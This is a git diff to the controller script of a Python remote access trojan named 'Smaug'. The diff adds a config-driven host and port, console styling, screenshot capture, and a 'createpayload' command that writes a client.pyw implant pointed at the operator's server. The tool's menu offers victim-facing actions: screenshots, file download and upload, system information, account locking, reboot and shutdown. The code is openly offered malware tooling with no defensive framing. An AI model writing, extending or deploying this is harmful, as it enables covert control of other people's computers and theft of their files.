@@ -5,12 +5,15 @@ import json
 import base64
 import socket
 from colorama import Fore
-
-host = "localhost"
-port = 42069
+from utils.config import *
+from utils.discordRPC import *
 
 # ============================================================================================================================ #
 
+config = Config("config.json")
+
+host = config.get("host")
+port = config.get("port")
 
 # ============================================================================================================================ #
 
@@ -30,13 +33,13 @@ banner = f"""{Fore.LIGHTRED_EX}
       / ,.`.      `.  \ _.-' \\',: ``\ \\
      / / :..`-'''``-)  `.   _.:''  ''\ \\
     : :  '' `-..''`/    |-''  |''  '' \ \\
-    | |  ''   ''  :     |__..-;''  ''  : :           >> {Fore.LIGHTBLACK_EX}Smaug {Fore.GREEN}v1.0 {Fore.LIGHTRED_EX}
-    | |  ''   ''  |     ;    / ''  ''  | |           >> {Fore.LIGHTBLACK_EX}Type {Fore.GREEN}'help'{Fore.LIGHTBLACK_EX} to see all available Commands{Fore.LIGHTRED_EX}
-    | |  ''   ''  ;    /--../_ ''_ '' _| |           >> {Fore.LIGHTBLACK_EX}Developed by {Fore.GREEN}gokiimax {Fore.LIGHTRED_EX}
+    | |  ''   ''  :     |__..-;''  ''  : :           » {Fore.LIGHTBLACK_EX}Smaug {Fore.GREEN}v1.0 {Fore.LIGHTRED_EX}
+    | |  ''   ''  |     ;    / ''  ''  | |           » {Fore.LIGHTBLACK_EX}Type {Fore.GREEN}'help'{Fore.LIGHTBLACK_EX} to see all available Commands{Fore.LIGHTRED_EX}
+    | |  ''   ''  ;    /--../_ ''_ '' _| |           » {Fore.LIGHTBLACK_EX}Developed by {Fore.GREEN}gokiimax {Fore.LIGHTRED_EX}
     | |  ''  _;:_/    :._  /-.'',-.'',-. |           
-    : :  '',;'`;/     |_ ,(   `'   `'   \|
-     \ \  \(   /\     :,'  \\
-      \ \.'/  : /    ,)    /
+    : :  '',;'`;/     |_ ,(   `'   `'   \|           » {Fore.LIGHTBLACK_EX}CONFIG SETTINGS {Fore.LIGHTRED_EX}«
+     \ \  \(   /\     :,'  \\                         » {Fore.LIGHTBLACK_EX}Host: {Fore.LIGHTRED_EX}{host}
+      \ \.'/  : /    ,)    /                         » {Fore.LIGHTBLACK_EX}Port: {Fore.LIGHTRED_EX}{port}
        \ ':   ':    / \   :
         `.\    :   :\  \  |
                 \  | `. \ |..-_
@@ -68,6 +71,7 @@ class Utils:
         commands = [
             ['help        ', 'Show all available commands'],
             ['cd          ', 'Change the current directory'],
+            ['ls          ', 'List the current directory'],
             ['turnmonoff  ', 'Turn the victims Monitor off'],
             ['turnmonon   ', 'Turn the victims Monitor on'],
             ['checkadmin  ', 'Check if the victim has admin Privileges'],
@@ -75,21 +79,21 @@ class Utils:
             ['clear       ', 'Clear the console'],
             ['reboot      ', 'Reboot the victims pc'],
             ['shutdown    ', 'Shutdown the victims pc'],
-            ['lock        ', 'Lock the victims account!'],
+            ['lock       ', 'Lock the victims account!'],
             ['screenshot ', 'Take a screenshot from the victims PC'],
             ['download   ', 'Download files from the victims PC'],
             ['upload     ', 'Upload files to the victims PC'],
             ['sysinfo    ', 'Shows Information about the victims PC'],
-            ['exit       ', 'Exit the application from both sites']
+            ['close      ', 'Close the connection and exit the application from both sites']
         ]
 
         index = 0
         print("\n")
-        print("\t╭─────────────────╮")
+        print(f"\t{Fore.LIGHTRED_EX}╭─────────────────╮")
         for command in commands:
-            print(f"\t│ [{index}] {command[0]}│ >> {command[1]}")
+            print(f"{Fore.LIGHTRED_EX}\t│ {Fore.RESET}{index} {command[0]}{Fore.LIGHTRED_EX}  │{Fore.RESET} {Fore.LIGHTBLACK_EX}»{Fore.RESET} {command[1]}")
             index += 1
-        print("\t╰─────────────────╯")
+        print(f"\t{Fore.LIGHTRED_EX}╰─────────────────╯")
 
 # ============================================================================================================================ #
 
@@ -135,7 +139,7 @@ class Server:
 
     def execute_remotely(self, command):
         self.data_send(command)
-        if command[0] == "exit":
+        if command[0] == "close":
             self.connection.close()
             exit(-1)
         return self.data_receive()
@@ -161,6 +165,8 @@ class Server:
         elif "[+]" in result:
             return "\n" + Fore.GREEN + result + Fore.RESET + "\n"
         else:
+            result = result.replace("╭", f"{Fore.LIGHTRED_EX}╭{Fore.RESET}").replace("╰", f"{Fore.LIGHTRED_EX}╰{Fore.RESET}").replace("─", f"{Fore.LIGHTRED_EX}─{Fore.RESET}").replace("╮", f"{Fore.LIGHTRED_EX}╮{Fore.RESET}").replace("╯", f"{Fore.LIGHTRED_EX}╯{Fore.RESET}")
+            result = result.replace("│", f"{Fore.LIGHTRED_EX}│{Fore.RESET}").replace("»", f"{Fore.LIGHTBLACK_EX}»{Fore.RESET}")
             return "\n" + Fore.RESET + result + Fore.RESET + "\n"
 
 # ============================================================================================================================ #
@@ -168,7 +174,7 @@ class Server:
     def run(self):
         while True:
             # Handle Command input
-            command = input(f"{Fore.LIGHTRED_EX}╭── {Fore.WHITE}[{Fore.LIGHTRED_EX}Smaug@{self.address[0]}{Fore.WHITE}]\n{Fore.LIGHTRED_EX}╰──────# {Fore.RESET}")
+            command = input(f"{Fore.LIGHTRED_EX}╭── {Fore.WHITE}[ {Fore.LIGHTRED_EX}Smaug@{self.address[0]}{Fore.WHITE} ]\n{Fore.LIGHTRED_EX}╰──────# {Fore.RESET}")
             command = command.split(" ", 1)
 
             try:
@@ -179,6 +185,9 @@ class Server:
                 result = self.execute_remotely(command)
                 if command[0] == "download" and "[-] Error" not in result:
                     result = self.write_file(command[1], result)
+
+                if command[0] == "screenshot" and "[-] Error" not in result:
+                    result = self.write_file("screenshot.png", result)
 
                 elif command[0] == "help":
                     Utils.help_command()
@@ -191,12 +200,77 @@ class Server:
 
 # ============================================================================================================================ #
 
+class Application():
+
+    def printHelp(self):
+        commands = [
+            ['help          ', 'Show all available commands'],
+            ['start server  ', 'Start the rat server'],
+            ['createpayload ', 'Create a payload with your settings'],
+            ['clear         ', 'Clear the console'],
+            ['exit          ', 'Exit the application']
+        ]
+
+        index = 0
+        print("\n")
+        print(f"\t{Fore.LIGHTRED_EX}╭───────────────────╮")
+        for command in commands:
+            print(f"{Fore.LIGHTRED_EX}\t│ {Fore.RESET}{index} {command[0]}{Fore.LIGHTRED_EX}  │{Fore.RESET} {Fore.LIGHTBLACK_EX}»{Fore.RESET} {command[1]}")
+            index += 1
+        print(f"\t{Fore.LIGHTRED_EX}╰───────────────────╯")
+        print("\n")
+
+# ============================================================================================================================ #
+
+    def create_payload(self):
+        if os.path.isfile('./out/client.pyw'):
+            os.remove("./out/client.pyw")
+
+        with open("./resources/client.txt", 'r') as first_file, open('./out/client.pyw', 'a') as second_file:
+            for line in first_file:
+                second_file.write(line.replace("ENTER HOST", host).replace("'ENTER PORT'", f"{port}"))
+
+        print(f"{Fore.LIGHTGREEN_EX}[+] Successfully created payload in './out/client.pyw'")
+
+# ============================================================================================================================ #
+
+    def run(self):
+        while True:
+            # Handle Command input
+            command = input(f"{Fore.LIGHTRED_EX}╭── {Fore.WHITE}[ {Fore.LIGHTRED_EX}Smaug@admin{Fore.WHITE} ]\n{Fore.LIGHTRED_EX}╰──────# {Fore.RESET}")
+            command = command.split(" ", 1)
+
+            try:
+                if command[0] == "start" and command[1] == "server":
+                    server = Server(host, port)
+                    server.run()
+                    break
+                
+                elif command[0] == "help":
+                    self.printHelp()
+
+                elif command[0] == "clear":
+                    Utils.clear_command()
+
+                elif command[0] == "createpayload":
+                    self.create_payload()
+
+                elif command[0] == "exit":
+                    exit(-1)
+            except Exception:
+                print("[-] Error running command, check the syntax of the command.")
+
+# ============================================================================================================================ #
+
 def main():
     Utils.clear()
     print(banner)
 
-    # Start the server
-    activeServer = Server(host, port)
-    activeServer.run()
+    if config.get("discordRPC"):
+        Discord("1083754884114956400")
+
+    # Start the application
+    application = Application()
+    application.run()
 
 main()
